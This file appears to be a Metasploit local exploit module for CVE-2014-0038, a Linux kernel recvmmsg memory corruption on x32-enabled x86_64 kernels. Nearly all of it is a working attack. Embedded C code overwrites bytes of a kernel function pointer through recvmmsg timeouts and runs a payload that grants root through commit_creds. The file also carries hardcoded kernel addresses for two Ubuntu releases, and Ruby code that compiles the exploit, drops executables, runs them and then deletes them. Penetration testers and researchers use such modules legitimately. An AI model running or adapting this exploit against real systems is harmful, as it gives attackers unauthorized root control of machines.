##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/local/linux_kernel'
require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/exe'

class Metasploit4 < Msf::Exploit::Local
  Rank = ManualRanking # Becuase of the exploitation technique, plus kernel exploit...

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Exploit::Local::LinuxKernel
  include Msf::Exploit::Local::Linux

  def initialize(info={})
    super( update_info( info, {
      'Name'          => 'Linux Kernel Recvmmsg Local Privilege Escalation',
      'Description'   => %q{
        This module exploits a kernel memory corruption in the linux kernel. The
        vulnerability is due to the recvmmsg system call using user space data
        in the timeout parameter without proper validation. The vulnerability
        affects to x64 kernels with CONFIG_X86_X32. Ubuntu based distributions
        have been found vulnerable to this issue. In order to use the Manual
        target, several kernel addresses must be provided. They can be obtained
        from System.map or /proc/kallsyms.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'pageexec',    # discovery
          'Kees Cook',   # PoC
          'saelo',       # Exploit (this module is based on it)
          'juan vazquez' # metasploit module
        ],
      'Platform'      => 'linux' ,
      'Arch'          => ARCH_X86_64 ,
      'SessionTypes'  => 'shell',
      'References'    =>
        [
          [ 'CVE', '2014-0038' ],
          [ 'OSVDB', '102749' ],
          [ 'URL', 'http://seclists.org/oss-sec/2014/q1/187' ],
          [ 'URL', 'https://github.com/saelo/cve-2014-0038' ]
        ],
      'Targets'       =>
        [
          [ 'Ubuntu Desktop 13.10 x64 Kernel 3.11.0-12-generic',
            {
              'PTMX_FOPS'           => 0xffffffff81fb30c0,
              'TTY_RELEASE'         => 0xffffffff8142fec0,
              'COMMIT_CREDS'        => 0xffffffff8108ad40,
              'PREPARE_KERNEL_CRED' => 0xffffffff8108b010
            }
          ],
          [ 'Ubuntu Server 12.04.3 x64 Kernel 3.8.0-29-generic',
            {
              'PTMX_FOPS'           => 0xffffffff81f16f20,
              'TTY_RELEASE'         => 0xffffffff81420c30,
              'COMMIT_CREDS'        => 0xffffffff81086780,
              'PREPARE_KERNEL_CRED' => 0xffffffff81086a00
            }
          ],
          [ 'Manual', {} ]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => "Jan 29 2014"
    }))

    register_options([
        OptString.new("WritableDir", [ true, "A directory where we can write files (must not be mounted noexec)", "/tmp" ]),
        OptBool.new("DEBUG",         [ true, "Make the exploit executable be verbose about what it's doing", false ])
    ])

    register_advanced_options([
      OptInt.new('PTMX_FOPS',           [ false, "The ptmx_fops address"]),
      OptInt.new('TTY_RELEASE',         [ false, "The tty_release address"]),
      OptInt.new('COMMIT_CREDS',        [ false, "The commit_creds address"]),
      OptInt.new('PREPARE_KERNEL_CRED', [ false, "The prepare_kernel_cred address"])
    ])
  end

  def executable_path
    @executable_path ||= datastore["WritableDir"] + "/" + rand_text_alphanumeric(8)

    @executable_path
  end

  def shell_path
    @shell_path ||= datastore["WritableDir"] + "/" + rand_text_alphanumeric(8)

    @shell_path
  end

  def set_symbols
    if target.name =~ /Manual/
      @ptmx_fops = datastore['PTMX_FOPS']
      @tty_release = datastore['TTY_RELEASE']
      @commit_creds = datastore['COMMIT_CREDS']
      @prepare_kernel_cred = datastore['PREPARE_KERNEL_CRED']

      if @ptmx_fops == 0 || @tty_release == 0 || @commit_creds == 0 || @commit_creds == 0
        fail_with(Exploit::Failure::BadConfig, "Please configure all the required kernel addresses")
      end
    else
      @ptmx_fops = target['PTMX_FOPS']
      @tty_release = target['TTY_RELEASE']
      @commit_creds = target['COMMIT_CREDS']
      @prepare_kernel_cred = target['PREPARE_KERNEL_CRED']

      if @ptmx_fops.nil? || @tty_release.nil? || @commit_creds.nil? || @commit_creds.nil?
        fail_with(Exploit::Failure::BadConfig, "The selected target is missing kernel addresses")
      end
    end
  end

  def main
    <<-EOF
#define _GNU_SOURCE
/*
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/mman.h>
*/

typedef char                __int8_t;
typedef unsigned char       __uint8_t;
typedef short               __int16_t;
typedef unsigned short      __uint16_t;
typedef int                 __int32_t;
typedef unsigned int        __uint32_t;
typedef long long           __int64_t;
typedef unsigned long long  __uint64_t;
typedef __uint32_t          uint32_t;
typedef __uint16_t          uint16_t;
typedef __uint16_t          in_port_t;
typedef unsigned short      __kernel_sa_family_t;
typedef __uint8_t           sa_family_t;
typedef __uint32_t          in_addr_t;
typedef __uint32_t          socklen_t;
typedef unsigned int        __kernel_uid32_t;
typedef __kernel_uid32_t    uid_t;
typedef long unsigned int   __kernel_size_t;
typedef __kernel_size_t     size_t;
typedef int                 ssize_t;
typedef long                time_t;
typedef int                 pid_t;
typedef long                __off_t;
typedef __off_t             off_t;

struct in_addr {
  in_addr_t s_addr;
};

#define __SOCK_SIZE__ 16           /* sizeof(struct sockaddr) */
struct sockaddr_in {
  __kernel_sa_family_t sin_family; /* Address family */
  in_port_t            sin_port;   /* Port number */
  struct in_addr       sin_addr;   /* Internet address */

  /* Pad to size of `struct sockaddr'. */
  unsigned char __pad[__SOCK_SIZE__ - sizeof(short int) - sizeof(unsigned short int) - sizeof(struct in_addr)];
};

struct iovec {
  void *   iov_base; /* [XSI] Base address of I/O memory region */
  size_t   iov_len;  /* [XSI] Size of region iov_base points to */
};

struct msghdr {
  void *          msg_name;       /* Socket name  */
  int             msg_namelen;    /* Length of name */
  struct iovec *  msg_iov;        /* Data blocks */
  __kernel_size_t msg_iovlen;     /* Number of blocks */
  void *          msg_control;    /* Per protocol magic (eg BSD file descriptor passing) */
  __kernel_size_t msg_controllen; /* Length of cmsg list */
  unsigned int    msg_flags;
};

struct mmsghdr {
  struct msghdr msg_hdr;
  unsigned int  msg_len;
};

extern int rand(void);
extern void srand(unsigned int seed);
extern time_t time(time_t *t);
extern int socket(int __domain, int __type, int __protocol);
extern void perror(const char *__s);
extern void exit(int __status);
extern uint32_t htonl(uint32_t hostlong);
extern uint16_t htons(uint16_t hostshort);
extern int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
extern void *memset(void *s, int c, size_t n);
extern int printf(const char *__format, ...);
extern pid_t fork(void);
extern unsigned int sleep(unsigned int seconds);
extern ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen);
extern int syscall(int number, ...);
extern pid_t waitpid(pid_t pid, int *status, int options);
extern void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
extern void *memcpy(void *dest, const void *src, size_t n);
extern int open(const char *pathname, int flags);
extern int close(int fd);
extern uid_t getuid(void);
extern int execl(const char *path, const char *arg, ...);

#define NULL ((void*)0)
#define AF_INET 2
#define SOCK_DGRAM 2
#define EXIT_FAILURE 1
#define EXIT_SUCCESS 0
#define INADDR_LOOPBACK 0x7f000001 /* 127.0.0.1   */
#define IPPROTO_UDP 17 /* user datagram protocol */

#define __X32_SYSCALL_BIT 0x40000000
#undef __NR_recvmmsg
#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)

#define BUFSIZE 200
#define PAYLOADSIZE 0x2000
#define FOPS_RELEASE_OFFSET 13*8

#ifdef DEBUG
# define dprintf printf
#else
# define dprintf
#endif

/*
 * Adapt these addresses for your need.
 * see /boot/System.map* or /proc/kallsyms
 */
#ifndef PTMX_FOPS
#define PTMX_FOPS           0x#{@ptmx_fops.to_s(16)}LL
#define TTY_RELEASE         0x#{@tty_release.to_s(16)}LL
#define COMMIT_CREDS        0x#{@commit_creds.to_s(16)}LL
#define PREPARE_KERNEL_CRED 0x#{@prepare_kernel_cred.to_s(16)}LL
#endif

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

/*
 * Match signature of int release(struct inode*, struct file*).
 *
 * See here: http://grsecurity.net/~spender/exploits/enlightenment.tgz
 */

int __attribute__((regparm(3)))
kernel_payload(void* foo, void* bar)
{
  void *pointer1 = (PTMX_FOPS + FOPS_RELEASE_OFFSET + 4);
  long *pointer2 = (PTMX_FOPS + FOPS_RELEASE_OFFSET + 8);
  long *pointer3 = (PTMX_FOPS + FOPS_RELEASE_OFFSET + 16);

  _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
  _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

  /* restore function pointer and following two longs */

  // *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;
  (void *)pointer1[0] = -1;
  (void *)pointer1[1] = -1;
  (void *)pointer1[2] = -1;
  (void *)pointer1[3] = -1;

  // *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 8)) = 0;
  (long *)pointer2[0] = 0;

  // *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 16)) = 0;
  (long *)pointer3[0] = 0;

  /* escalate to root */
  commit_creds(prepare_kernel_cred(0));

  return -1;
}

/*
 * Write a zero to the byte at then given address.
 * Only works if the current value is 0xff.
 */
void zero_out(long addr)
{
  int sockfd, retval, port, pid, i;
  struct sockaddr_in sa;
  char buf[BUFSIZE];
  struct mmsghdr msgs;
  struct iovec iovecs;

  srand(time(NULL));

  port = 1024 + (rand() % (0x10000 - 1024));

  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd == -1) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  sa.sin_family      = AF_INET;
  sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  sa.sin_port        = htons(port);
  if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
    perror("bind()");
    exit(EXIT_FAILURE);
  }

  memset(&msgs, 0, sizeof(msgs));
  iovecs.iov_base         = buf;
  iovecs.iov_len          = BUFSIZE;
  msgs.msg_hdr.msg_iov    = &iovecs;
  msgs.msg_hdr.msg_iovlen = 1;

  /*
   * start a seperate process to send a udp message after 255 seconds so the syscall returns,
   * but not after updating the timout struct and writing the remaining time into it.
   * 0xff - 255 seconds = 0x00
   */
  dprintf("clearing byte at 0x%lx\\n", addr);
  pid = fork();
  if (pid == 0) {
    memset(buf, 0x41, BUFSIZE);

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
      perror("socket()");
      exit(EXIT_FAILURE);
    }

    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port        = htons(port);

    sleep(0xfe);

    dprintf("waking up parent...\\n");
    sendto(sockfd, buf, BUFSIZE, 0, &sa, sizeof(sa));
    exit(EXIT_SUCCESS);
  } else if (pid > 0) {
    retval = syscall(__NR_recvmmsg, sockfd, &msgs, 1, 0, (void*)addr);
    if (retval == -1) {
      dprintf("address can't be written to, not a valid timespec struct!\\n");
      exit(EXIT_FAILURE);
    }
    waitpid(pid, 0, 0);
    dprintf("byte zeroed out\\n");
  } else {
    perror("fork()");
    exit(EXIT_FAILURE);
  }
}

int main(int argc, char** argv)
{
    long code, target;
    int pwn, i, pids[3], pid;

    /* Prepare payload... */
    dprintf("preparing payload buffer...\\n");
    code = (long)mmap((void*)(TTY_RELEASE & 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
    memset((void*)code, 0x90, PAYLOADSIZE);
    code += PAYLOADSIZE - 1024;

    memcpy((void*)code, &kernel_payload, 1024);

    /*
     * Now clear the three most significant bytes of the fops pointer
     * to the release function.
     * This will make it point into the memory region mapped above.
     */
    dprintf("changing kernel pointer to point into controlled buffer...\\n");
    target = PTMX_FOPS + FOPS_RELEASE_OFFSET;
    for (i = 0; i < 3; i++) {
        pids[i] = fork();
        if (pids[i] == 0) {
            zero_out(target + (5 + i));
            exit(EXIT_SUCCESS);
        }
        sleep(1);
    }
    dprintf("waiting for timeouts...\\n");
    dprintf("0s/255s\\n");
    for (i = 10; i <= 250; i += 10) {
      sleep(10);
      dprintf("%is/255s\\n", i);
    }
    for (i = 0; i < 3; i++) {
      waitpid(pids[i], 0, 0);
    }

    /* ... and trigger. */
    dprintf("releasing file descriptor to call manipulated pointer in kernel mode...\\n");
    pwn = open("/dev/ptmx", 'r');
    close(pwn);

    if (getuid() != 0) {
      dprintf("failed to get root :(\\n");
      exit(EXIT_FAILURE);
    }

    dprintf("got root, enjoy :)\\n");

    pid  = fork();
    if (pid == 0) {
      return execl("#{shell_path}", "#{File.basename(shell_path)}", NULL);
    } else if (pid > 0) {
      exit(EXIT_SUCCESS);
    } else {
      dprintf("Error while forking\\n");
      exit(EXIT_FAILURE);
    }
}
    EOF
  end

  def exploit
    set_symbols

    sc = Metasm::ELF.new(@cpu)
    sc.parse %Q|
      #ifdef __ELF__
        .section ".bss" rwx
        .section ".text" rwx
      #endif
    |

    if datastore["DEBUG"]
      cparser.parse "#define DEBUG\n"
    end

    cparser.parse(main, "main.c")

    asm = cpu.new_ccompiler(cparser, sc).compile

    sc.parse asm

    sc.assemble
    sc.c_set_default_entrypoint

    begin
      if sc.kind_of? Metasm::ELF
        elf = sc.encode_string
      else
        foo = sc.encode_string
        elf = Msf::Util::EXE.to_linux_x64_elf(framework, foo)
      end
    rescue
      print_error("Metasm Encoding failed: #{$!}")
      elog("Metasm Encoding failed: #{$!.class} : #{$!}")
      elog("Call stack:\n#{$!.backtrace.join("\n")}")
      return
    end

    print_status("Writing exploit executable to #{executable_path} (#{elf.length} bytes)...")
    rm_f(executable_path)
    write_file(executable_path, elf)

    print_status("Writing payload  to #{shell_path}...")
    rm_f(shell_path)
    write_file(shell_path, generate_payload_exe)

    print_status("Providing +x permissions...")
    cmd_exec("chmod +x #{executable_path}")
    cmd_exec("chmod +x #{shell_path}")

    print_warning("Exploiting. It needs some time, 4-5 minutes...")
    output = cmd_exec("#{executable_path}", nil, 265) # Exploitation technique needs 255 seconds
    output.each_line { |line| print_debug line.chomp }

    print_status("Deleting binaries and waiting the session...")
    rm_f(executable_path)
    rm_f(shell_path)
  end

end
